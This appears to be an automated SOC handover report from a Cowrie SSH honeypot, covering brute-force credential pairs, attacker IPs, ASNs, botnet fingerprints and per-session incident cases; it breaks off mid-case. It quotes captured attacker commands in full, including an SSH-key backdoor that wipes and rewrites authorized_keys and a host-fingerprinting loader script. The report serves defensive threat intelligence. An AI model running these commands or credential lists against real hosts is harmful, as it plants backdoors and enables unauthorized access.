# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-03 |
| **Generated At** | 2026-08-03T11:31:08Z |
| **Shift Time** | 11:31 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **248** |
| Confirmed Threats | **215** |
| False Positives Filtered | **33** (13.3%) |
| Unique Attacker IPs | **122** |
| Countries of Origin | **32** |
| High Severity Cases | **120** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **128** |
| Malware Samples Analyzed | **3** HIGH · **27** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **150** |
| Unique Credential Pairs | **90** |
| Unique Usernames | **15** |
| Unique Passwords | **60** |
| Successful Auth Pairs | **123** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 65 |
| `admin` | 24 |
| `support` | 19 |
| `guest` | 11 |
| `supervisor` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `LeitboGi0ro` | 8 |
| `support` | 7 |
| `123@@@` | 6 |
| `123123` | 6 |
| `1q2w3e4r` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `LeitboGi0ro` | 8 |
| `support` | `support` | 7 |
| `root` | `123@@@` | 6 |
| `root` | `smo@@kkklss` | 4 |
| `root` | `stxadmin` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `000000` | `92.118.39.50` | 2026-08-03T06:57:25 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-08-03T06:57:42 |
| `root` | `123@@@` | `144.22.238.238` | 2026-08-03T06:57:44 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-08-03T06:57:44 |
| `root` | `54321` | `2.55.122.202` | 2026-08-03T06:58:15 |
| `root` | `111111` | `92.118.39.50` | 2026-08-03T06:59:25 |
| `root` | `stxadmin` | `34.146.248.7` | 2026-08-03T07:00:14 |
| `root` | `stxadmin` | `61.12.84.172` | 2026-08-03T07:00:22 |
| `root` | `123` | `92.118.39.50` | 2026-08-03T07:01:41 |
| `root` | `123123` | `92.118.39.50` | 2026-08-03T07:03:58 |
| `root` | `asd12345` | `10.0.0.73` | 2026-08-03T07:04:14 |
| `root` | `asd12345` | `195.222.57.190` | 2026-08-03T07:06:03 |
| `root` | `123321` | `92.118.39.50` | 2026-08-03T07:06:14 |
| `root` | `1234` | `92.118.39.50` | 2026-08-03T07:08:17 |
| `root` | `12345` | `92.118.39.50` | 2026-08-03T07:10:17 |
| `root` | `stxadmin` | `10.0.0.73` | 2026-08-03T07:12:10 |
| `root` | `1234567` | `92.118.39.50` | 2026-08-03T07:14:15 |
| `root` | `12345678` | `92.118.39.50` | 2026-08-03T07:15:54 |
| `root` | `123456789` | `92.118.39.50` | 2026-08-03T07:17:48 |
| `support` | `support` | `176.53.159.196` | 2026-08-03T07:17:49 |
| `root` | `1234567890` | `92.118.39.50` | 2026-08-03T07:20:28 |
| `root` | `asd12345` | `103.31.39.188` | 2026-08-03T07:22:29 |
| `root` | `123456a` | `92.118.39.50` | 2026-08-03T07:22:50 |
| `root` | `123456b` | `92.118.39.50` | 2026-08-03T07:24:43 |
| `root` | `123abc` | `92.118.39.50` | 2026-08-03T07:26:36 |
| `root` | `123qwe` | `92.118.39.50` | 2026-08-03T07:28:25 |
| `root` | `stxadmin` | `60.172.54.36` | 2026-08-03T07:30:03 |
| `root` | `1q2w3e4r` | `92.118.39.50` | 2026-08-03T07:30:20 |
| `root` | `555555` | `92.118.39.50` | 2026-08-03T07:32:00 |
| `supervisor` | `test` | `200.159.14.187` | 2026-08-03T07:32:50 |
| `supervisor` | `test` | `103.147.248.44` | 2026-08-03T07:33:04 |
| `root` | `654321` | `92.118.39.50` | 2026-08-03T07:33:43 |
| `guest` | `maintenance` | `92.255.196.185` | 2026-08-03T07:35:24 |
| `root` | `7777777` | `92.118.39.50` | 2026-08-03T07:35:44 |
| `root` | `abc123` | `92.118.39.50` | 2026-08-03T07:39:01 |
| `Support` | `Support2016` | `10.0.0.73` | 2026-08-03T07:39:19 |
| `root` | `admin` | `92.118.39.50` | 2026-08-03T07:41:20 |
| `support` | `support` | `10.0.0.73` | 2026-08-03T07:42:50 |
| `root` | `admin123` | `92.118.39.50` | 2026-08-03T07:43:06 |
| `pi` | `abcd1234` | `10.0.0.73` | 2026-08-03T07:44:37 |
| `root` | `passw0rd` | `92.118.39.50` | 2026-08-03T07:44:55 |
| `root` | `password` | `92.118.39.50` | 2026-08-03T07:46:38 |
| `root` | `password1` | `92.118.39.50` | 2026-08-03T07:48:27 |
| `guest` | `1q2w3e4r` | `10.0.0.73` | 2026-08-03T07:48:32 |
| `root` | `qwerty` | `92.118.39.50` | 2026-08-03T07:50:14 |
| `root` | `welcome` | `92.118.39.50` | 2026-08-03T07:52:26 |
| `root` | ` ` | `45.10.175.77` | 2026-08-03T07:54:30 |
| `admin` | `000000` | `92.118.39.50` | 2026-08-03T07:55:43 |
| `admin` | `111111` | `92.118.39.50` | 2026-08-03T07:57:41 |
| `admin` | `123` | `92.118.39.50` | 2026-08-03T07:59:26 |
| `admin` | `123123` | `92.118.39.50` | 2026-08-03T08:01:10 |
| `root` | `LeitboGi0ro` | `168.110.102.254` | 2026-08-03T08:01:15 |
| `root` | `123@@@` | `168.110.102.254` | 2026-08-03T08:01:18 |
| `admin` | `123321` | `92.118.39.50` | 2026-08-03T08:02:59 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-08-03T08:03:55 |
| `admin` | `1234` | `92.118.39.50` | 2026-08-03T08:04:37 |
| `admin` | `12345` | `92.118.39.50` | 2026-08-03T08:06:08 |
| `admin` | `123456` | `92.118.39.50` | 2026-08-03T08:07:39 |
| `guest` | `1q2w3e4r` | `222.76.248.54` | 2026-08-03T08:07:46 |
| `guest` | `1q2w3e4r` | `117.250.250.2` | 2026-08-03T08:07:54 |
| `admin` | `1234567` | `92.118.39.50` | 2026-08-03T08:09:11 |
| `admin` | `12345678` | `92.118.39.50` | 2026-08-03T08:10:57 |
| `admin` | `123456789` | `92.118.39.50` | 2026-08-03T08:13:05 |
| `guest` | `letmein` | `10.0.0.73` | 2026-08-03T08:14:07 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `65.49.1.142` | 2026-08-03T08:14:20 |
| `admin` | `1234567890` | `92.118.39.50` | 2026-08-03T08:15:59 |
| `admin` | `123456a` | `92.118.39.50` | 2026-08-03T08:18:51 |
| `admin` | `123qwe` | `92.118.39.50` | 2026-08-03T08:20:25 |
| `user` | `user5` | `10.0.0.73` | 2026-08-03T08:21:57 |
| `admin` | `1q2w3e4r` | `92.118.39.50` | 2026-08-03T08:22:04 |
| `ubnt` | `ubnt12` | `10.0.0.73` | 2026-08-03T08:23:29 |
| `admin` | `654321` | `92.118.39.50` | 2026-08-03T08:23:35 |
| `admin` | `7777777` | `92.118.39.50` | 2026-08-03T08:25:05 |
| `admin` | `abc123` | `92.118.39.50` | 2026-08-03T08:26:41 |
| `admin` | `admin` | `92.118.39.50` | 2026-08-03T08:28:32 |
| `admin` | `admin123` | `92.118.39.50` | 2026-08-03T08:31:02 |
| `guest` | `letmein` | `65.20.134.97` | 2026-08-03T08:32:19 |
| `guest` | `letmein` | `121.189.198.60` | 2026-08-03T08:32:27 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-03T08:33:53 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-03T08:33:53 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-03T08:33:57 |
| `admin` | `passw0rd` | `92.118.39.50` | 2026-08-03T08:34:27 |
| `admin` | `password` | `92.118.39.50` | 2026-08-03T08:36:24 |
| `dev` | `Admin@123` | `103.190.214.241` | 2026-08-03T08:37:54 |
| `345gs5662d34` | `345gs5662d34` | `103.190.214.241` | 2026-08-03T08:37:58 |
| `dev` | `3245gs5662d34` | `103.190.214.241` | 2026-08-03T08:38:00 |
| `admin` | `password1` | `92.118.39.50` | 2026-08-03T08:38:31 |
| `admin` | `qwerty` | `92.118.39.50` | 2026-08-03T08:40:32 |
| `administrator` | `123` | `92.118.39.50` | 2026-08-03T08:42:36 |
| `guest` | `guest88` | `102.90.34.90` | 2026-08-03T08:45:05 |
| `administrator` | `123123` | `92.118.39.50` | 2026-08-03T08:45:10 |
| `guest` | `guest88` | `95.87.248.223` | 2026-08-03T08:45:17 |
| `administrator` | `1234` | `92.118.39.50` | 2026-08-03T08:48:18 |
| `administrator` | `12345` | `92.118.39.50` | 2026-08-03T08:50:07 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `45.156.128.56` | 2026-08-03T08:50:39 |
| `support` | `aaaaaa` | `136.56.34.147` | 2026-08-03T08:50:48 |
| `support` | `aaaaaa` | `50.217.255.171` | 2026-08-03T08:50:54 |
| `guest` | `guest88` | `187.8.120.90` | 2026-08-03T09:14:29 |
| `support` | `admin1` | `138.118.213.68` | 2026-08-03T09:19:57 |
| `support` | `support7` | `10.0.0.73` | 2026-08-03T09:23:50 |
| `supervisor` | `supervisor9` | `10.0.0.73` | 2026-08-03T09:32:52 |
| `root` | `1` | `92.118.39.50` | 2026-08-03T09:33:32 |
| `root` | `12` | `92.118.39.50` | 2026-08-03T09:35:49 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-03T09:36:14 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-03T09:36:14 |
| `support` | `support7` | `58.22.255.28` | 2026-08-03T09:41:53 |
| `support` | `admin1` | `122.187.237.122` | 2026-08-03T09:49:21 |
| `supervisor` | `supervisor9` | `213.234.9.218` | 2026-08-03T09:51:39 |
| `info` | `info` | `110.164.201.73` | 2026-08-03T09:55:11 |
| `info` | `info` | `117.70.94.155` | 2026-08-03T09:55:22 |
| `supervisor` | `123123` | `10.0.0.73` | 2026-08-03T09:58:33 |
| `info` | `info` | `10.0.0.73` | 2026-08-03T10:07:06 |
| `nobody` | `nobody13` | `10.0.0.73` | 2026-08-03T10:07:25 |
| `supervisor` | `123123` | `111.39.206.23` | 2026-08-03T10:16:39 |
| `nobody` | `nobody13` | `116.114.94.242` | 2026-08-03T10:26:11 |
| `nobody` | `nobody13` | `36.137.38.119` | 2026-08-03T10:26:26 |
| `nobody` | `nobody13` | `45.178.227.0` | 2026-08-03T10:26:28 |
| `support` | `Password01!` | `37.25.36.197` | 2026-08-03T10:29:59 |
| `support` | `Azerty01` | `65.20.204.41` | 2026-08-03T10:34:42 |
| `support` | `Azerty01` | `175.198.18.3` | 2026-08-03T10:34:59 |
| `support` | `Password01!` | `10.0.0.73` | 2026-08-03T10:41:33 |
| `root` | `master123` | `10.0.0.73` | 2026-08-03T10:42:08 |
| `support` | `Azerty01` | `27.107.102.154` | 2026-08-03T10:51:21 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **248** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 73 |
| OpenSSH | 33 |
| Paramiko (Python) | 20 |
| libssh | 13 |
| PuTTY | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 63 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 33 | 33 |
| `a2de0f306611...` | Mirai/variant | 14 | 3 |
| `6372ee695756...` | Modern SSH client | 4 | 1 |
| `eff4c24daffc...` | Modern SSH client | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 63 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 33 | 33 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 14 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 10 | 5 | — |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `5bd26477da54...` | PuTTY | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 61 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.50`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.190.214.241`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **122** |
| Unique ASNs | **68** |
| High-Risk ASNs | **57** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 8 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 8 | HIGH |
| `AS46562` | Performive LLC | 8 | MEDIUM |
| `AS63949` | Akamai Connected Cloud | 6 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 6 | HIGH |
| `AS31898` | Oracle Corporation | 4 | HIGH |
| `AS211680` | NSEC - Sistemas Informaticos, S.A. | 4 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (120)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-286ae195ca6a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 06:57 |
| **Last Seen** | 2026-08-03 06:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 06:57:23` | `cowrie.session.connect` |
| `2026-08-03 06:57:23` | `cowrie.client.version` |
| `2026-08-03 06:57:23` | `cowrie.client.kex` |
| `2026-08-03 06:57:25` | `cowrie.login.success` |
| `2026-08-03 06:57:26` | `cowrie.session.params` |
| `2026-08-03 06:57:26` | `cowrie.command.input` |
| `2026-08-03 06:57:26` | `cowrie.command.input` |
| `2026-08-03 06:57:26` | `cowrie.command.input` |
| `2026-08-03 06:57:26` | `cowrie.command.input` |
| `2026-08-03 06:57:26` | `cowrie.command.input` |
| `2026-08-03 06:57:26` | `cowrie.command.success` |
| `2026-08-03 06:57:26` | `cowrie.command.input` |
| `2026-08-03 06:57:26` | `cowrie.command.input` |
| `2026-08-03 06:57:26` | `cowrie.command.input` |
| `2026-08-03 06:57:26` | `cowrie.command.input` |
| `2026-08-03 06:57:27` | `cowrie.log.closed` |
| `2026-08-03 06:57:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-037be9af91e3

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-03 06:57 |
| **Last Seen** | 2026-08-03 06:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 06:57:41` | `cowrie.session.connect` |
| `2026-08-03 06:57:41` | `cowrie.client.version` |
| `2026-08-03 06:57:41` | `cowrie.client.kex` |
| `2026-08-03 06:57:42` | `cowrie.login.success` |
| `2026-08-03 06:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81a072f30bca

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-03 06:57 |
| **Last Seen** | 2026-08-03 06:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 06:57:43` | `cowrie.session.connect` |
| `2026-08-03 06:57:43` | `cowrie.client.version` |
| `2026-08-03 06:57:44` | `cowrie.client.kex` |
| `2026-08-03 06:57:44` | `cowrie.login.success` |
| `2026-08-03 06:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c25ba777009a

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-03 06:57 |
| **Last Seen** | 2026-08-03 06:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 06:57:44` | `cowrie.session.connect` |
| `2026-08-03 06:57:44` | `cowrie.client.version` |
| `2026-08-03 06:57:44` | `cowrie.client.kex` |
| `2026-08-03 06:57:44` | `cowrie.login.success` |
| `2026-08-03 06:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0d17c168a66

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-03 06:57 |
| **Last Seen** | 2026-08-03 06:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 06:57:44` | `cowrie.session.connect` |
| `2026-08-03 06:57:44` | `cowrie.client.version` |
| `2026-08-03 06:57:45` | `cowrie.client.kex` |
| `2026-08-03 06:57:45` | `cowrie.login.success` |
| `2026-08-03 06:57:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99ef42f35cb1

| Field | Detail |
|---|---|
| **Source IP** | `2.55.122[.]202` |
| **First Seen** | 2026-08-03 06:58 |
| **Last Seen** | 2026-08-03 06:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 06:58:13` | `cowrie.session.connect` |
| `2026-08-03 06:58:14` | `cowrie.client.version` |
| `2026-08-03 06:58:14` | `cowrie.client.kex` |
| `2026-08-03 06:58:15` | `cowrie.login.success` |
| `2026-08-03 06:58:15` | `cowrie.direct-tcpip.request` |
| `2026-08-03 06:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.55.122[.]202` to AbuseIPDB if not already reported
- [ ] Block `2.55.122[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e55b39d158ce

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 06:59 |
| **Last Seen** | 2026-08-03 06:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 06:59:24` | `cowrie.session.connect` |
| `2026-08-03 06:59:24` | `cowrie.client.version` |
| `2026-08-03 06:59:24` | `cowrie.client.kex` |
| `2026-08-03 06:59:25` | `cowrie.login.success` |
| `2026-08-03 06:59:25` | `cowrie.session.params` |
| `2026-08-03 06:59:25` | `cowrie.command.input` |
| `2026-08-03 06:59:25` | `cowrie.command.input` |
| `2026-08-03 06:59:25` | `cowrie.command.input` |
| `2026-08-03 06:59:25` | `cowrie.command.input` |
| `2026-08-03 06:59:25` | `cowrie.command.input` |
| `2026-08-03 06:59:25` | `cowrie.command.success` |
| `2026-08-03 06:59:25` | `cowrie.command.input` |
| `2026-08-03 06:59:25` | `cowrie.command.input` |
| `2026-08-03 06:59:25` | `cowrie.command.input` |
| `2026-08-03 06:59:25` | `cowrie.command.input` |
| `2026-08-03 06:59:26` | `cowrie.log.closed` |
| `2026-08-03 06:59:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3de8553ac6ba

| Field | Detail |
|---|---|
| **Source IP** | `34.146.248[.]7` |
| **First Seen** | 2026-08-03 07:00 |
| **Last Seen** | 2026-08-03 07:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:00:11` | `cowrie.session.connect` |
| `2026-08-03 07:00:12` | `cowrie.client.version` |
| `2026-08-03 07:00:12` | `cowrie.client.kex` |
| `2026-08-03 07:00:14` | `cowrie.login.success` |
| `2026-08-03 07:00:15` | `cowrie.direct-tcpip.request` |
| `2026-08-03 07:00:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.146.248[.]7` to AbuseIPDB if not already reported
- [ ] Block `34.146.248[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f9b08368c23

| Field | Detail |
|---|---|
| **Source IP** | `61.12.84[.]172` |
| **First Seen** | 2026-08-03 07:00 |
| **Last Seen** | 2026-08-03 07:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:00:20` | `cowrie.session.connect` |
| `2026-08-03 07:00:20` | `cowrie.client.version` |
| `2026-08-03 07:00:20` | `cowrie.client.kex` |
| `2026-08-03 07:00:22` | `cowrie.login.success` |
| `2026-08-03 07:00:22` | `cowrie.direct-tcpip.request` |
| `2026-08-03 07:00:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.84[.]172` to AbuseIPDB if not already reported
- [ ] Block `61.12.84[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4be3095f26ea

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:01 |
| **Last Seen** | 2026-08-03 07:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:01:40` | `cowrie.session.connect` |
| `2026-08-03 07:01:40` | `cowrie.client.version` |
| `2026-08-03 07:01:40` | `cowrie.client.kex` |
| `2026-08-03 07:01:41` | `cowrie.login.success` |
| `2026-08-03 07:01:42` | `cowrie.session.params` |
| `2026-08-03 07:01:42` | `cowrie.command.input` |
| `2026-08-03 07:01:42` | `cowrie.command.input` |
| `2026-08-03 07:01:42` | `cowrie.command.input` |
